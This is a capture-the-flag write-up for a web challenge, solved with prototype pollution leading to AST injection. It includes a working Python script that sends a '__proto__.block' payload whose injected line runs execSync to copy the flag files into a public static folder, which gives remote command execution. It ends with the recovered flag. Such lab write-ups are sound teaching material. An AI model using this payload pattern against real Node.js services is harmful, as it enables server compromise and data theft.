## So much Pollution (Points: 282)

This is how the problem statement goes: 

![image](https://user-images.githubusercontent.com/98008131/164889159-9830a1b2-5cd6-4e78-8c62-2cd472754248.png)

Clicking on the link we are taken to this page, where we must submit a blitz song, which must be on of the 4 options provided.

![image](https://user-images.githubusercontent.com/98008131/164889216-995cf871-7b21-4d02-8b5e-79441e441ab8.png)

Trying to google about AST and pollution, we come across [this](https://www.linkedin.com/pulse/ast-injection-prototype-pollution-joshua-berben/) writeup, a problem very similar to this one. Copying the code from the question, and making few changes to fit to our problem, we have the following:

```python
#!/usr/bin/python

import requests


ENDPOINT = 'http://wannahack.copsiitbhu.co.in:2464/api/submit'

OUTPUT = 'http://wannahack.copsiitbhu.co.in:2464/static/out'


request = requests.post(ENDPOINT, json = {

   "song.name":"The Goose went wild",

       "__proto__.block": {

           "type":"Text",

           "line":"process.mainModule.require('child_process').execSync('cat flag* > /app/static/out')"

       }

})


print (request.text)

print (requests.get(OUTPUT).text)
```

This gives us the following output:

![image](https://user-images.githubusercontent.com/98008131/164889419-22729bf7-83b2-4af7-aeab-e50f1f5c1410.png)

There is our flag. Flag: `wannahack{pr0t0_typ3_p011ut10n_ftw_!!!!}`
